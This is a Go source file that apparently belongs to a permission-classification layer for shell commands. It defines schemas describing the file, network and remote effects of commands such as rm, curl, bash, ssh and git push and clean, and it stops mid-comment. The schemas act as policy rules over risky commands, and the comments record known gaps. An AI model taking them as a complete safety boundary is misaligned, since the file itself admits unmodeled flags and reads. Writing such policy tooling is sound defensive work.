package cmddesc

import "sort"

// Registry maps a command basename to its schema value. It is the ONLY place
// a command name appears in the spike: adding a command is adding an entry.
type Registry struct {
	schemas map[string]CommandSchema
}

// NewRegistry builds a registry from schema values, keyed by Name.
func NewRegistry(schemas ...CommandSchema) Registry {
	r := Registry{schemas: make(map[string]CommandSchema, len(schemas))}
	for _, s := range schemas {
		r.schemas[s.Name] = s
	}
	return r
}

// Lookup returns the schema for a basename.
func (r Registry) Lookup(basename string) (CommandSchema, bool) {
	s, ok := r.schemas[basename]
	return s, ok
}

// Names lists the registered basenames, sorted.
func (r Registry) Names() []string {
	names := make([]string, 0, len(r.schemas))
	for n := range r.schemas {
		names = append(names, n)
	}
	sort.Strings(names)
	return names
}

// DefaultRegistry returns the spike's registry as plain values. head, rm and
// tee are the proof that another command is ONLY a registry entry; sh is the
// proof that a second NAME for the same semantics is only a second key.
func DefaultRegistry() Registry {
	return NewRegistry(
		catSchema, headSchema, sedSchema, rmSchema, cpSchema, teeSchema,
		bashSchema, renamed(bashSchema, "sh"),
		xargsSchema, curlSchema,
		gitSchema,
		echoSchema, printfSchema, trueSchema, falseSchema, testSchema, renamed(testSchema, "["),
		lsSchema, wcSchema, sortSchema, tailSchema, grepSchema, mkdirSchema,
		exportSchema,
		// slice 3n (registry_breadth.go): beads, trivial inert commands,
		// JSON/YAML processors, gofmt.
		bdSchema, sleepSchema, whichSchema, pgrepSchema, psSchema,
		jqSchema, yqSchema, gofmtSchema,
		// slice 3o: cd (graph-level CWD threading in effectgraph).
		cdSchema,
		// slice 3p: awk/gawk dialect classifier and schema.
		awkSchema, renamed(awkSchema, "gawk"),
		// slice 3q: find interpreter (starting points, expression walk,
		// -delete/-exec/-fprint).
		findSchema,
		// slice 3x: go subcommand schema (test/generate/run/build/vet/fmt/
		// list/env/version/mod/clean/install/get) and TrustedCheckoutExec.
		goSchema,
		// slice 3y: kubectl subcommand schema and the per-kube-context
		// operator policy (KubeContextPolicy).
		kubectlSchema,
		// slice 3aa: ssh's own EffectNet-plus-remote-scoped-child schema
		// (scp is deliberately deferred — see sshSchema's own doc comment).
		sshSchema,
	)
}

// renamed returns a copy of s registered under another basename. The Flags
// map is shared, which is fine: schemas are read-only values.
func renamed(s CommandSchema, name string) CommandSchema {
	s.Name = name
	return s
}

// Schema-author shorthands for the common flag shapes.
var (
	// inert is the arity-0, transform-free flag spec.
	inert = FlagSpec{}
	// literal1 takes one inert value.
	literal1 = FlagSpec{Arity: ArityOne, Operand: Literal}
	// literalOpt takes an inert value only when glued (`--backup[=CONTROL]`).
	literalOpt = FlagSpec{Arity: ArityOptionalGlued, Operand: Literal}
)

var catSchema = CommandSchema{
	Name:       "cat",
	Provenance: "GNU coreutils 9.x cat --help",
	Flags: map[string]FlagSpec{
		"-n": inert, "--number": inert,
		"-b": inert, "--number-nonblank": inert,
		"-A": inert, "--show-all": inert,
		"-E": inert, "--show-ends": inert,
		"-T": inert, "--show-tabs": inert,
		"-s": inert, "--squeeze-blank": inert,
		"-v": inert, "--show-nonprinting": inert,
		"-e": inert, "-t": inert, "-u": inert,
	},
	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var headSchema = CommandSchema{
	Name:       "head",
	Provenance: "GNU coreutils 9.x head --help",
	Flags: map[string]FlagSpec{
		"-n": {Arity: 1, Operand: Literal}, "--lines": {Arity: 1, Operand: Literal},
		"-c": {Arity: 1, Operand: Literal}, "--bytes": {Arity: 1, Operand: Literal},
		"-q": inert, "--quiet": inert,
		"-v": inert, "--verbose": inert,
	},
	Positionals:  PositionalSpec{Rest: PathRead, StdinToken: "-"},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// sedSchema: the first positional is the program unless -e/-f supplied one;
// the rest are input files, which -i upgrades from read to modify. sed has no
// `-` stdin token (a file named `-` is a file), so stdin is the
// no-path-operands rule alone.
var sedSchema = CommandSchema{
	Name:       "sed",
	Provenance: "sed (GNU sed) 4.10, sed --help",
	Flags: map[string]FlagSpec{
		"-n": inert, "--quiet": inert, "--silent": inert,
		"-E": inert, "-r": inert, "--regexp-extended": inert,
		"-s": inert, "--separate": inert,
		"-z": inert, "--null-data": inert,
		"-u": inert, "--unbuffered": inert,
		"--posix": inert, "--debug": inert, "--sandbox": inert,
		"--follow-symlinks": inert,
		"-e":                {Arity: ArityOne, Operand: Program("sed")}, "--expression": {Arity: ArityOne, Operand: Program("sed")},
		"-f": {Arity: ArityOne, Operand: PathRead}, "--file": {Arity: ArityOne, Operand: PathRead},
		"-i":         {Arity: ArityOptionalGlued, Operand: Literal, Transform: EffectTransform{Kind: TransformInPlace}},
		"--in-place": {Arity: ArityOptionalGlued, Operand: Literal, Transform: EffectTransform{Kind: TransformInPlace}},
		"-l":         literal1, "--line-length": literal1,
	},
	Positionals: PositionalSpec{
		Leading:               []OperandRole{Program("sed")},
		LeadingSkippedByFlags: []string{"-e", "--expression", "-f", "--file"},
		Rest:                  PathRead,
	},
	Stdin:        StdinWhenNoPathOperands,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// rmSchema: every positional is deleted. `--preserve-root[=all]` is
// optional-glued per --help (its value is inert either way).
var rmSchema = CommandSchema{
	Name:       "rm",
	Provenance: "rm (GNU coreutils) 9.11, rm --help",
	Flags: map[string]FlagSpec{
		"-f": inert, "--force": inert,
		"-i": inert, "-I": inert,
		"--interactive": literalOpt,
		"-r":            inert, "-R": inert, "--recursive": inert,
		"-d": inert, "--dir": inert,
		"-v": inert, "--verbose": inert,
		"--one-file-system":  inert,
		"--preserve-root":    literalOpt,
		"--no-preserve-root": inert,
	},
	Positionals:  PositionalSpec{Rest: PathDelete},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// cpSchema: sources are read and the LAST positional is the destination
// (truncated, or created under -n) unless -t named a target directory, in
// which case that directory is modified. At least one source is required.
// Flags on this host's --help that change WHAT is written (-l/-s link instead
// of copy, -b and --backup+-S naming a backup file, --remove-destination,
// --attributes-only, --reflink, --sparse, -d, -Z, --context, --copy-contents,
// --keep-directory-symlink, --strip-trailing-slashes, --no-preserve, --debug)
// are left unmodeled beyond what the brief named, so they abstain.
var cpSchema = CommandSchema{
	Name:       "cp",
	Provenance: "cp (GNU coreutils) 9.11, cp --help",
	Flags: map[string]FlagSpec{
		"-r": inert, "-R": inert, "--recursive": inert,
		"-a": inert, "--archive": inert,
		"-p": inert,
		"-v": inert, "--verbose": inert,
		"-f": inert, "--force": inert,
		"-i": inert, "--interactive": inert,
		"-u": inert,
		"-L": inert, "--dereference": inert,
		"-P": inert, "--no-dereference": inert,
		"-H":        inert,
		"-x":        inert,
		"--parents": inert,
		"-n":        {Transform: EffectTransform{Kind: TransformNoClobber}}, "--no-clobber": {Transform: EffectTransform{Kind: TransformNoClobber}},
		"-t": {Arity: ArityOne, Operand: PathModify}, "--target-directory": {Arity: ArityOne, Operand: PathModify},
		"-T": inert, "--no-target-directory": inert,
		"-S": literal1, "--suffix": literal1,
		"--backup":   literalOpt,
		"--preserve": literalOpt,
		"--update":   literalOpt,
	},
	Positionals: PositionalSpec{
		Rest:                   PathRead,
		MinRest:                1,
		Trailing:               []OperandRole{PathTruncate},
		TrailingSkippedByFlags: []string{"-t", "--target-directory"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// teeSchema: stdin is copied to stdout and to every file operand, which is
// truncated — or appended to (modify) under -a.
var teeSchema = CommandSchema{
	Name:       "tee",
	Provenance: "tee (GNU coreutils) 9.11, tee --help",
	Flags: map[string]FlagSpec{
		"-a": {Transform: EffectTransform{Kind: TransformAppend}}, "--append": {Transform: EffectTransform{Kind: TransformAppend}},
		"-i": inert, "--ignore-interrupts": inert,
		"-p":             inert,
		"--output-error": literalOpt,
	},
	Positionals:  PositionalSpec{Rest: PathTruncate},
	Stdin:        StdinAlways,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// bashSchema (also registered as sh): `-c` carries a shell program that the
// shell dialect hands back for recursion; the positionals after it are $0,
// $1... (inert). WITHOUT `-c` the first positional is a SCRIPT FILE that will
// be executed — role Program("shell-file"), a dialect with no interpreter, so
// it is insufficient: we cannot read the file, and Abstain is the honest
// answer. Options end at the first positional (a later `-x` belongs to the
// script). Stdin is StdinNever for the modeled forms; the no-`-c`, no-file
// form reads a script from stdin, which resolveRoles already makes
// insufficient (too few positionals) — an accepted gap, not a modeled stdin
// read. `-n` (noexec) is deliberately left out so it abstains. `+O` is listed
// for completeness but the generic scanner only recognises `-`-prefixed
// tokens, so it currently lands as a positional (inert under -c; the
// script-file slot otherwise — insufficient either way).
var bashSchema = CommandSchema{
	Name:       "bash",
	Provenance: "GNU bash 5.3.9, bash --help / help set",
	Flags: map[string]FlagSpec{
		"-c": {Arity: ArityOne, Operand: Program("shell")},
		"-x": inert, "-e": inert, "-u": inert, "-v": inert,
		"-l": inert, "--login": inert,
		"-i":          inert,
		"--norc":      inert,
		"--noprofile": inert,
		"--posix":     inert,
		"-o":          literal1,
		"-O":          literal1, "+O": literal1,
	},
	Positionals: PositionalSpec{
		Leading:               []OperandRole{Program("shell-file")},
		LeadingSkippedByFlags: []string{"-c"},
		Rest:                  Literal,
	},
	Stdin:                 StdinNever,
	Stdout:                StdoutNone,
	UnknownFlag:           UnknownFlagInsufficient,
	EndOfOptions:          true,
	PositionalsEndOptions: true,
}

// xargsSchema: the positionals are the argv of the command xargs runs, which
// only the xargs interpreter can give meaning to (Rest is Literal for the
// generic layer). Options end at the first positional (GNU getopt `+`: a
// later `-f` belongs to the child). Stdin is Always even under `-a FILE`,
// which actually replaces it — an over-report in the fail-closed direction.
// `-p`/`--interactive` and `--process-slot-var` are left out (abstain). Host
// spellings differ from the brief: `-E END` is short-only and `-e`/`--eof`
// take an OPTIONAL glued value.
var xargsSchema = CommandSchema{
	Name:        "xargs",
	Provenance:  "xargs (GNU findutils) 4.10.0, xargs --help",
	Interpreter: "xargs",
	Flags: map[string]FlagSpec{
		"-0": inert, "--null": inert,
		"-r": inert, "--no-run-if-empty": inert,
		"-t": inert, "--verbose": inert,
		"-x": inert, "--exit": inert,
		"-o": inert, "--open-tty": inert,
		"-n": literal1, "--max-args": literal1,
		"-L": literal1, "--max-lines": literal1,
		"-l": literalOpt,
		"-P": literal1, "--max-procs": literal1,
		"-s": literal1, "--max-chars": literal1,
		"-d": literal1, "--delimiter": literal1,
		"-E": literal1,
		"-e": literalOpt, "--eof": literalOpt,
		"-I": literal1,
		"-i": literalOpt, "--replace": literalOpt,
		"-a": {Arity: ArityOne, Operand: PathRead}, "--arg-file": {Arity: ArityOne, Operand: PathRead},
	},
	Positionals:           PositionalSpec{Rest: Literal},
	Stdin:                 StdinAlways,
	Stdout:                StdoutNone,
	UnknownFlag:           UnknownFlagInsufficient,
	EndOfOptions:          true,
	PositionalsEndOptions: true,
}

// curlSchema: URLs are positionals (or --url values) that the curl
// interpreter turns into net effects; the data flags use the generic
// data-or-@file convention; -o truncates, -T reads. Deliberately left out so
// they abstain: -k/--insecure, -u/--user, -O/--remote-name, -b/-c cookies,
// -K/--config, -x/--proxy, and -H's own `@file` form (modeled as a literal).
// `--include` is the pre-8.10 spelling of `--show-headers`; this host still
// accepts it.
var curlSchema = CommandSchema{
	Name:        "curl",
	Provenance:  "curl 8.21.0, curl --help all",
	Interpreter: "curl",
	Flags: map[string]FlagSpec{
		"-s": inert, "--silent": inert,
		"-S": inert, "--show-error": inert,
		"-L": inert, "--location": inert,
		"-f": inert, "--fail": inert,
		"-i": inert, "--include": inert, "--show-headers": inert,
		"-I": inert, "--head": inert,
		"-v": inert, "--verbose": inert,
		"-G": inert, "--get": inert,
		"--compressed": inert,
		"-N":           inert, "--no-buffer": inert,
		"-o": {Arity: ArityOne, Operand: PathTruncate}, "--output": {Arity: ArityOne, Operand: PathTruncate},
		"-H": literal1, "--header": literal1,
		"-A": literal1, "--user-agent": literal1,
		"-X": literal1, "--request": literal1,
		"-m": literal1, "--max-time": literal1,
		"--connect-timeout": literal1,
		"--retry":           literal1,
		"-w":                literal1, "--write-out": literal1,
		"-d": {Arity: ArityOne, Operand: DataOrAtFile}, "--data": {Arity: ArityOne, Operand: DataOrAtFile},
		"--data-binary":    {Arity: ArityOne, Operand: DataOrAtFile},
		"--data-raw":       {Arity: ArityOne, Operand: DataOrAtFile},
		"--data-urlencode": {Arity: ArityOne, Operand: DataOrAtFile},
		"-F":               {Arity: ArityOne, Operand: DataOrAtFile}, "--form": {Arity: ArityOne, Operand: DataOrAtFile},
		"-T": {Arity: ArityOne, Operand: PathRead}, "--upload-file": {Arity: ArityOne, Operand: PathRead},
		"--url": literal1,
	},
	Positionals:  PositionalSpec{Rest: Literal},
	Stdin:        StdinNever,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: false,
}

// gitSchema: subcommand dispatch (CommandSchema.Subcommands). Flags is the
// GLOBAL-option table, scanned by interpretSubcommand until the first
// positional (the subcommand key); Positionals/Stdin/Stdout/ImplicitEffects
// on THIS value are unused. Modeled inert (they cannot change what a
// subcommand sees or does): --no-pager/-P, --paginate/-p (pager selection),
// --no-optional-locks, --literal-pathspecs/--glob-pathspecs/
// --noglob-pathspecs/--icase-pathspecs (pathspec magic — the subcommand's own
// pathspec text is unaffected either way, only how *later* magic characters
// in it are interpreted, which this slice does not model any command
// consuming), --no-replace-objects. Deliberately LEFT UNMODELED (abstain),
// because each changes WHERE or HOW the subcommand acts: `-C <dir>` and
// `--work-tree=`/`--git-dir=` change the working tree/repo location a
// pathspec resolves against, `-c <k=v>` and `--config-env=` can override any
// config the subcommand consults (including remote URLs), `--exec-path=`
// changes which git-* helper binaries run, `--namespace=` changes which refs
// a ref name resolves to, and `--super-prefix=` (an internal, undocumented
// flag on this host — still excluded on the same rationale) changes the
// effective path prefix for submodule recursion. `--bare` is also left
// unmodeled per the brief.
var gitSchema = CommandSchema{
	Name:       "git",
	Provenance: "git version 2.54.0, git --help / git help git",
	Flags: map[string]FlagSpec{
		"--no-pager": inert, "-P": inert,
		"--paginate": inert, "-p": inert,
		"--no-optional-locks":  inert,
		"--literal-pathspecs":  inert,
		"--glob-pathspecs":     inert,
		"--noglob-pathspecs":   inert,
		"--icase-pathspecs":    inert,
		"--no-replace-objects": inert,
	},
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
	Subcommands: map[string]CommandSchema{
		"status":    gitStatusSchema,
		"clean":     gitCleanSchema,
		"push":      gitPushSchema,
		"log":       gitLogSchema,
		"show":      gitShowSchema,
		"diff":      gitDiffSchema,
		"rev-parse": gitRevParseSchema,
		"rev-list":  gitRevListSchema,
		"branch":    gitBranchSchema,
		"worktree":  gitWorktreeSchema,
		"config":    gitConfigSchema,
		"add":       gitAddSchema,
		"commit":    gitCommitSchema,
		"rm":        gitRmSchema,
		"mv":        gitMvSchema,
	},
}

// gitStatusSchema: an implicit PathRead of "." ALWAYS fires (git status
// always reports on the working tree even with no pathspec); each pathspec
// positional is an additional PathRead. Flags verified against this host's
// `git status -h`; every modeled spelling is inert (output formatting only).
var gitStatusSchema = CommandSchema{
	Name:       "status",
	Provenance: "git version 2.54.0, git status -h",
	Flags: map[string]FlagSpec{
		"-s": inert, "--short": inert,
		"--long": inert,
		"-b":     inert, "--branch": inert,
		"--show-stash": inert,
		"--porcelain":  literalOpt,
		"-z":           inert,
		"-v":           inert, "--verbose": inert,
		"-u": literalOpt, "--untracked-files": literalOpt,
		"--ignored":      literalOpt,
		"--ahead-behind": inert, "--no-ahead-behind": inert,
		"--renames": inert, "--no-renames": inert,
		"--column": literalOpt, "--no-column": inert,
		"--no-lock-index":     inert,
		"--ignore-submodules": literalOpt,
	},
	Positionals: PositionalSpec{Rest: PathRead},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: "."},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitCleanSchema: every pathspec is a PathDelete, and an implicit PathDelete
// of "." fires when NO pathspec is given.
//
// `-n`/`--dry-run` are DELIBERATELY ABSENT from Flags, so they are unknown
// flags => insufficient => Abstain. Operator ruling pg2-4yy4r item 3
// (2026-07-30, implemented in production by pg2-u0e0c; reaffirmed on
// tc-z806.4, 2026-09-07): `git clean` abstains in EVERY spelling, dry-run
// included, with no flag inspection — the flag-aware split (approve
// -n/--dry-run, abstain -f) was refuted because the flag test itself is the
// bug surface (`-fdx` is one token; git accepts any unambiguous long-option
// prefix). Slice 3a had modeled -n/--dry-run as a real TransformDryRun here,
// which auto-approved `git clean -n`; that re-litigated the ruling and is
// undone as data. TransformDryRun itself is unaffected (git push -n is a
// separate pending decision, tc-ife3 item 2). Raising clean to Reject would
// need a NEW ruling (production's clean arm asks for one).
//
// `-i`/`--interactive` is likewise left unmodeled (its prompts make the
// actual deletions data-dependent, not statically knowable). Flags verified
// against this host's `git clean -h`.
var gitCleanSchema = CommandSchema{
	Name:       "clean",
	Provenance: "git version 2.54.0, git clean -h",
	Flags: map[string]FlagSpec{
		"-f": inert, "--force": inert,
		"-d": inert,
		"-x": inert, "-X": inert,
		"-q": inert, "--quiet": inert,
		"-e": literal1, "--exclude": literal1,
	},
	Positionals: PositionalSpec{Rest: PathDelete},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathDelete, Target: ".", WhenNoPositionals: true},
	},
	Stdin: StdinNever,
	// clean always explains what it removed (or would remove, under -n) —
	// filenames only, so metadata rather than content.
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitPushSchema: the leading positional (when any positional is given at
// all — LeadingOptional) names the remote, a KindRemote operand whose default
// Operation is "push"; -f/--force/--force-with-lease upgrade that to
// "force-push", -d/--delete to "delete-ref" (TransformForce/
// TransformDeleteRef, applied generically by effect shape); -n/--dry-run
// MARKS it via TransformDryRun (cmddesc/transform.go) rather than removing
// it — slice 3w (tc-lc8f item 4d; tc-ife3 item 2): a dry run of an ordinary
// push still nets Approve (effectpolicy's RemoteMutation treats a
// DryRun-marked "push" as Permitted), but a dry run of what would otherwise
// be a FORBIDDEN operation (force-push, delete-ref) abstains instead of
// silently auto-approving, per an operator ruling recorded on RemoteMutation
// and TransformDryRun's own doc comments — this holds regardless of whether
// -n or the force/delete flag appears first on the command line. With NO
// positional at all, an implicit effect stands in for the default remote,
// marked Dynamic because which remote that is comes from git config at
// runtime, not from argv. Deliberately left unmodeled (abstain): --no-verify
// (skips the pre-push hook — a materially different trust boundary),
// --mirror (mirrors ALL refs, not just what a modeled refspec would name),
// --signed[=] (changes what the push cryptographically asserts),
// --recurse-submodules (recurses into repositories this schema knows
// nothing about). Flags verified against this host's `git push -h`.
var gitPushSchema = CommandSchema{
	Name:       "push",
	Provenance: "git version 2.54.0, git push -h",
	Flags: map[string]FlagSpec{
		"-n": {Transform: EffectTransform{Kind: TransformDryRun}}, "--dry-run": {Transform: EffectTransform{Kind: TransformDryRun}},
		"-f": {Transform: EffectTransform{Kind: TransformForce}}, "--force": {Transform: EffectTransform{Kind: TransformForce}},
		"--force-with-lease": {Arity: ArityOptionalGlued, Operand: Literal, Transform: EffectTransform{Kind: TransformForce}},
		"-d":                 {Transform: EffectTransform{Kind: TransformDeleteRef}}, "--delete": {Transform: EffectTransform{Kind: TransformDeleteRef}},
		"-v": inert, "--verbose": inert,
		"-q": inert, "--quiet": inert,
		"--porcelain": inert,
		"--progress":  inert, "--no-progress": inert,
		"-u": inert, "--set-upstream": inert,
		"--tags": inert, "--follow-tags": inert,
		"--all": inert, "--branches": inert,
		"--prune":  inert,
		"--atomic": inert, "--no-atomic": inert,
		"--thin": inert, "--no-thin": inert,
		"-o": literal1, "--push-option": literal1,
		"--receive-pack": literal1, "--exec": literal1,
	},
	Positionals: PositionalSpec{
		Leading:         []OperandRole{Remote("push")},
		LeadingOptional: true,
		Rest:            Literal,
	},
	ImplicitEffects: []ImplicitEffect{
		{Role: Remote("push"), Target: "<default-remote>", Dynamic: true, WhenNoPositionals: true},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutNone,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitLogSchema, gitShowSchema, gitDiffSchema, gitRevParseSchema,
// gitRevListSchema: read-only history/plumbing queries, verified against
// this host's git 2.54.0 (`git help log`/`show`/`diff`/`rev-parse`/
// `rev-list`, man pages — `-h` alone only prints an abbreviated subset for
// this family, so `git help <sub>` was used to confirm every flag below).
//
// Positionals are revisions, revision-ranges and pathspecs; modeling every
// positional as Literal is imprecise for a PATHSPEC (`git show
// HEAD:secrets.txt` genuinely reads file content), but parsing `REV:PATH`
// colon syntax or a revision range is out of scope for this slice. Instead:
// log/rev-parse/rev-list get an ALWAYS-on implicit PathRead of ".git"
// (metadata — which refs/objects exist, not file content); show/diff get an
// implicit PathRead of "." (content may flow through the diff/show output)
// plus StdoutContent. This costs nothing today's policies would otherwise
// catch (no golden case here targets a secret via colon syntax) and is
// honestly documented rather than silently precise-looking.
var gitLogSchema = CommandSchema{
	Name:       "log",
	Provenance: "git version 2.54.0, git help log",
	Flags: map[string]FlagSpec{
		"--oneline": inert,
		"-n":        literal1, "--max-count": literal1,
		"--stat":      inert,
		"-p":          inert,
		"--name-only": inert, "--name-status": inert,
		"--format": literal1, "--pretty": literal1,
		"--since": literal1, "--after": literal1,
		"--until": literal1, "--before": literal1,
		"--author": literal1,
		"--grep":   literal1,
		"-S":       literal1, "-G": literal1,
		"--output": {Arity: ArityOne, Operand: PathTruncate},
	},
	Positionals: PositionalSpec{Rest: Literal},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var gitShowSchema = CommandSchema{
	Name:       "show",
	Provenance: "git version 2.54.0, git help show",
	Flags: map[string]FlagSpec{
		"--format": literal1, "--pretty": literal1,
		"--stat":      inert,
		"-p":          inert,
		"--name-only": inert, "--name-status": inert,
		"--output": {Arity: ArityOne, Operand: PathTruncate},
	},
	Positionals: PositionalSpec{Rest: Literal},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: "."},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var gitDiffSchema = CommandSchema{
	Name:       "diff",
	Provenance: "git version 2.54.0, git help diff",
	Flags: map[string]FlagSpec{
		"--stat":      inert,
		"-p":          inert,
		"--name-only": inert, "--name-status": inert,
		"--cached": inert, "--staged": inert,
		"-S": literal1, "-G": literal1,
		"--output": {Arity: ArityOne, Operand: PathTruncate},
	},
	Positionals: PositionalSpec{Rest: Literal},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: "."},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutContent,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var gitRevParseSchema = CommandSchema{
	Name:       "rev-parse",
	Provenance: "git version 2.54.0, git help rev-parse",
	Flags: map[string]FlagSpec{
		"--abbrev-ref":    literalOpt,
		"--short":         literalOpt,
		"--show-toplevel": inert,
		"--git-dir":       inert,
		"--verify":        inert,
	},
	Positionals: PositionalSpec{Rest: Literal},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var gitRevListSchema = CommandSchema{
	Name:       "rev-list",
	Provenance: "git version 2.54.0, git help rev-list",
	Flags: map[string]FlagSpec{
		"-n": literal1, "--max-count": literal1,
		"--since": literal1, "--after": literal1,
		"--until": literal1, "--before": literal1,
		"--author": literal1,
		"--grep":   literal1,
	},
	Positionals: PositionalSpec{Rest: Literal},
	ImplicitEffects: []ImplicitEffect{
		{Role: PathRead, Target: ".git"},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitBranchSchema: THE VERDICT IS BY POSITIONAL SHAPE, DISAMBIGUATED BY ONE
// FLAG. Real `git branch` overloads one verb across list/create/delete/
// rename/copy — a bare trailing positional CREATES a ref, so every Rest
// positional defaults to Unmodeled (KindUnmodeled — already fail-closed via
// operand()'s existing default case). `-l`/`--list` is the one flag git's own
// docs single out as the disambiguator (`git branch -h`'s DESCRIPTION: "Note
// that when providing a <pattern>, you must use --list; otherwise the command
// may be interpreted as branch creation" — verified on this host's git
// 2.54.0), so RestOverride swaps Rest to Literal (inert: a wildcard pattern
// touches no filesystem/network/env effect) exactly when `-l`/`--list`
// appeared: `git branch --list 'maint-*'` now resolves its positional as a
// safe listing filter and is Sufficient, while a bare `git branch foo` still
// resolves Unmodeled and abstains. `-a`/`-r`/`--remotes` are NOT included in
// RestOverride.Flags even though they can also accompany a listing, because
// git's own docs name only `--list` as what makes a positional
// UNAMBIGUOUSLY a pattern — widening to `-a`/`-r` is left for a case that
// needs it.
//
// `--contains`/`--merged`/`--no-merged`/`--format` all take their argument
// as a FLAG VALUE, not a positional, so they do not interact with
// RestOverride at all. Deliberately left unmodeled (abstain, per the
// brief): -d/-D/-m/-M/-c/-C/-u/--set-upstream-to/--unset-upstream/
// --edit-description — every one of these mutates or targets a specific ref
// by name in a way this schema does not model.
var gitBranchSchema = CommandSchema{
	Name:       "branch",
	Provenance: "git version 2.54.0, git branch -h",
	Flags: map[string]FlagSpec{
		"-a": inert, "--all": inert,
		"-r": inert, "--remotes": inert,
		"-v": inert, "--verbose": inert,
		"-l": inert, "--list": inert,
		"--show-current": inert,
		"--contains":     literal1,
		"--merged":       literalOpt, "--no-merged": literalOpt,
		"--format": literal1,
	},
	Positionals: PositionalSpec{
		Rest:         Unmodeled,
		RestOverride: RestOverride{Flags: []string{"-l", "--list"}, Role: Literal},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitWorktreeListSchema/gitWorktreeSchema: `worktree` dispatches through a
// SECOND, nested Subcommands map (interpretSubcommand recurses on the same
// code path for any depth) — only `list` is modeled; `add`/`remove`/`prune`
// are absent from the map entirely, so they hit interpretSubcommand's own
// "unmodeled subcommand" failure with no new code. Flags verified against
// this host's `git worktree -h` / `git worktree list -h`.
var gitWorktreeListSchema = CommandSchema{
	Name:       "list",
	Provenance: "git version 2.54.0, git worktree list -h",
	Flags: map[string]FlagSpec{
		"-v": inert, "--verbose": inert,
		"--porcelain": inert,
		"-z":          inert,
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

var gitWorktreeSchema = CommandSchema{
	Name:         "worktree",
	Provenance:   "git version 2.54.0, git worktree -h",
	Flags:        map[string]FlagSpec{},
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
	Subcommands: map[string]CommandSchema{
		"list": gitWorktreeListSchema,
	},
}

// gitConfigSchema: read forms only, via the SAME Unmodeled-positional
// fallback gitBranchSchema uses, now with the SAME RestOverride
// disambiguator. `--get`/`--get-all`/`--get-regexp` take the config KEY as a
// FLAG VALUE (Literal — a key name is inert, not a path), so `git config
// --get user.name` resolves ZERO positionals and is Sufficient.
//
// A bare `git config NAME VALUE` (no --get*-family flag) still resolves to
// Unmodeled and abstains — real git's own DEPRECATED-MODES table (`git help
// config`, verified on this host's git 2.54.0) confirms `git config <name>
// <value> [<value-pattern>]` is the write form (`git config set`). But
// `--get`/`--get-all` name an OPTIONAL SECOND positional too: `--get <name>
// [<value-pattern>]` (same DEPRECATED-MODES table), a REGULAR-EXPRESSION
// filter over which of several same-key values is printed — a read
// refinement, not a write, and `--get-regexp` is included alongside them on
// the same rationale even though its own synopsis names no second
// positional (an extra one there is a real-git usage error either way, and
// Literal is still the fail-closed-safe reading: an error performs no
// write). The previous version of this schema mischaracterized that second
// positional as "a WRITE" and abstained on it; RestOverride now swaps Rest to
// Literal when any of --get/--get-all/--get-regexp appeared, so `git config
// --get user.name '^foo'` is Sufficient. The bare-NAME single-positional read
// form (`git config user.name`, the deprecated-but-supported equivalent of
// `git config get user.name`) is a SEPARATE, still-open gap: it needs a
// positional-COUNT distinguisher (exactly one Rest positional with no
// --get*-family flag is a read; two or more is a write), which is not a flag
// presence/absence and RestOverride does not express it — left unmodeled
// here rather than folded into this fix. Flags verified against this host's
// `git config -h` / `git help config`.
var gitConfigSchema = CommandSchema{
	Name:       "config",
	Provenance: "git version 2.54.0, git config -h",
	Flags: map[string]FlagSpec{
		"--get": literal1, "--get-all": literal1, "--get-regexp": literal1,
		"-l": inert, "--list": inert,
		"--show-origin": inert,
	},
	Positionals: PositionalSpec{
		Rest:         Unmodeled,
		RestOverride: RestOverride{Flags: []string{"--get", "--get-all", "--get-regexp"}, Role: Literal},
	},
	Stdin:        StdinNever,
	Stdout:       StdoutMetadata,
	UnknownFlag:  UnknownFlagInsufficient,
	EndOfOptions: true,
}

// gitAddSchema: pathspecs are read (their content is what gets staged into
// the index); staging always writes the index, so the implicit PathModify
